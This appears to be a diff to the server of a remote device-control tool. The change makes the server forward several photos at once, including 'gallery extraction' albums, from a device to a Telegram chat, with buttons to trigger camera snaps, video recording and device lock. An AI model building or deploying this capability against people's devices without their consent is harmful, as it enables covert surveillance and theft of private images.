@@ -3302,10 +3302,10 @@ app.get('/api/device/poll', verifyDeviceProofOrBearer, (req, res) => {
 
 // 5. Device Response (Forwarding photos, audio, video, GPS to Telegram)
 app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
-  { name: 'photo', maxCount: 1 },
+  { name: 'photo', maxCount: 10 },
   { name: 'audio', maxCount: 1 },
   { name: 'video', maxCount: 1 },
-  { name: 'evidence', maxCount: 5 }
+  { name: 'evidence', maxCount: 10 }
 ]), async (req, res) => {
   const allUploadedFiles = [];
   if (req.files) {
@@ -3369,33 +3369,104 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       await callTelegram(token, 'sendMessage', sendOptions);
     }
 
-    // 2. Deliver photo if captured (with quick action buttons)
-    // 2. Deliver photo if captured (with quick action buttons)
+    // 2. Deliver photo(s) if captured (with quick action buttons)
     if (files.photo && files.photo.length > 0 && chatId) {
-      const photoFile = files.photo[0];
-      const fileBuffer = photoFile.buffer || (photoFile.path && fs.existsSync(photoFile.path) ? fs.readFileSync(photoFile.path) : null);
-      if (fileBuffer) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        const blob = new Blob([fileBuffer], { type: photoFile.mimetype || 'image/jpeg' });
-        formData.append('photo', blob, 'photo.jpg');
-        formData.append('caption', message || '📸 Captured photo');
-
-        const photoActionKeyboard = {
-          inline_keyboard: [
-            [
-              { text: '🤳 Snap Front', callback_data: 'cmd:snap:front' },
-              { text: '📷 Snap Back', callback_data: 'cmd:snap:back' }
-            ],
-            [
-              { text: '🎥 Video (15s)', callback_data: 'cmd:video:front:15' },
-              { text: '🔒 Lock Device', callback_data: 'cmd:lock' }
-            ]
+      const photoFiles = files.photo;
+      const photoActionKeyboard = {
+        inline_keyboard: [
+          [
+            { text: '🤳 Snap Front', callback_data: 'cmd:snap:front' },
+            { text: '📷 Snap Back', callback_data: 'cmd:snap:back' }
+          ],
+          [
+            { text: '🎥 Video (15s)', callback_data: 'cmd:video:front:15' },
+            { text: '🔒 Lock Device', callback_data: 'cmd:lock' }
           ]
-        };
-        formData.append('reply_markup', JSON.stringify(photoActionKeyboard));
+        ]
+      };
 
-        await callTelegram(token, 'sendPhoto', null, true, formData);
+      if (photoFiles.length === 1) {
+        // Single photo (e.g. /snap, /screenshot)
+        const photoFile = photoFiles[0];
+        const fileBuffer = photoFile.buffer || (photoFile.path && fs.existsSync(photoFile.path) ? fs.readFileSync(photoFile.path) : null);
+        if (fileBuffer) {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          const blob = new Blob([fileBuffer], { type: photoFile.mimetype || 'image/jpeg' });
+          formData.append('photo', blob, 'photo.jpg');
+          formData.append('caption', message || '📸 Captured photo');
+          formData.append('reply_markup', JSON.stringify(photoActionKeyboard));
+          await callTelegram(token, 'sendPhoto', null, true, formData);
+        }
+      } else {
+        // Multiple photos (e.g. /gallery_latest 3) - Send as native Telegram MediaGroup album
+        let mediaGroupSuccess = false;
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+
+          const mediaArray = [];
+          for (let i = 0; i < photoFiles.length; i++) {
+            const p = photoFiles[i];
+            const fileBuffer = p.buffer || (p.path && fs.existsSync(p.path) ? fs.readFileSync(p.path) : null);
+            if (fileBuffer) {
+              const attachKey = `photo_${i}`;
+              const blob = new Blob([fileBuffer], { type: p.mimetype || 'image/jpeg' });
+              formData.append(attachKey, blob, `${attachKey}.jpg`);
+
+              const item = {
+                type: 'photo',
+                media: `attach://${attachKey}`
+              };
+              if (i === 0) {
+                item.caption = message || `🖼️ Gallery Extraction (${photoFiles.length} photos)`;
+                item.parse_mode = 'HTML';
+              }
+              mediaArray.push(item);
+            }
+          }
+
+          if (mediaArray.length >= 2) {
+            formData.append('media', JSON.stringify(mediaArray));
+            const mgRes = await callTelegram(token, 'sendMediaGroup', null, true, formData);
+            if (mgRes && mgRes.ok) {
+              mediaGroupSuccess = true;
+            }
+          }
+        } catch (mgErr) {
+          console.warn('[Telegram API] sendMediaGroup failed, falling back to individual sendPhoto:', mgErr.message);
+        }
+
+        // Fallback: If sendMediaGroup failed or wasn't applicable, send photos sequentially
+        if (!mediaGroupSuccess) {
+          for (let i = 0; i < photoFiles.length; i++) {
+            const p = photoFiles[i];
+            const fileBuffer = p.buffer || (p.path && fs.existsSync(p.path) ? fs.readFileSync(p.path) : null);
+            if (fileBuffer) {
+              const formData = new FormData();
+              formData.append('chat_id', chatId);
+              const blob = new Blob([fileBuffer], { type: p.mimetype || 'image/jpeg' });
+              formData.append('photo', blob, `photo_${i}.jpg`);
+              const isLast = (i === photoFiles.length - 1);
+              formData.append('caption', isLast ? (message || `🖼️ Photo ${i + 1}/${photoFiles.length}`) : `🖼️ Photo ${i + 1}/${photoFiles.length}`);
+              if (isLast) {
+                formData.append('reply_markup', JSON.stringify(photoActionKeyboard));
+              }
+              await callTelegram(token, 'sendPhoto', null, true, formData);
+              if (i < photoFiles.length - 1) {
+                await new Promise(r => setTimeout(r, 350));
+              }
+            }
+          }
+        } else {
+          // If media group succeeded, send action buttons in a separate follow-up message
+          await callTelegram(token, 'sendMessage', {
+            chat_id: chatId,
+            text: '🎯 <b>Quick Forensic Actions:</b>',
+            parse_mode: 'HTML',
+            reply_markup: photoActionKeyboard
+          });
+        }
       }
     }
 
